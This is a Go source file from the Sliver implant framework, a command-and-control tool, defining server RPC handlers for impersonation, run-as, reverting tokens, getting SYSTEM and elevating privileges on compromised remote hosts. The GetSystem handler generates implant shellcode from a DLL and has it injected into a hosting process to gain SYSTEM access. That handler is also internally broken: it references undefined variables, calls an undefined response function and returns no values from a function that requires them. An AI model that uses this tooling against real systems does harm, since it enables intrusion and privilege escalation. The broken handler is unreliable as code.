package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

// Impersonate - Impersonate a remote user
func (rpc *Server) Impersonate(ctx context.Context, msg *sliverpb.ImpersonateReq) (*sliverpb.Impersonate, error) {
	resp := &sliverpb.Impersonate{}
	err := rpc.GenericHandler(msg, msg.Request, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RunAs - Run a remote process as a specific user
func (rpc *Server) RunAs(ctx context.Context, msg *sliverpb.RunAsReq) (*sliverpb.RunAs, error) {
	resp := &sliverpb.RunAs{}
	err := rpc.GenericHandler(msg, msg.Request, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RevToSelf - Revert process context to self
func (rpc *Server) RevToSelf(ctx context.Context, msg *sliverpb.RevToSelfReq) (*sliverpb.RevToSelf, error) {
	resp := &sliverpb.RevToSelf{}
	err := rpc.GenericHandler(msg, msg.Request, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
func (rpc *Server) GetSystem(ctx context.Context, msg *sliverpb.GetSystemReq) (*sliverpb.GetSystem, error) {
	sliver := core.Hive.Sliver(msg.Request.SessionID)
	if sliver == nil {
		return nil, ErrInvalidSessionID
	}

	config := generate.SliverConfigFromProtobuf(gsReq.Config)
	config.Format = clientpb.ImplantConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.GetSystemReq{
		Data:           shellcode,
		HostingProcess: gsReq.HostingProcess,
		SliverID:       gsReq.SliverID,
	})

	data, err = sliver.Request(sliverpb.MsgGetSystemReq, timeout, data)
	resp(data, err)
}

// Elevate - Attempt to elevate remote privileges
func (rpc *Server) Elevate(ctx context.Context, msg *sliverpb.ElevateReq) (*sliverpb.Elevate, error) {
	resp := &sliverpb.Elevate{}
	err := rpc.GenericHandler(msg, msg.Request, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}
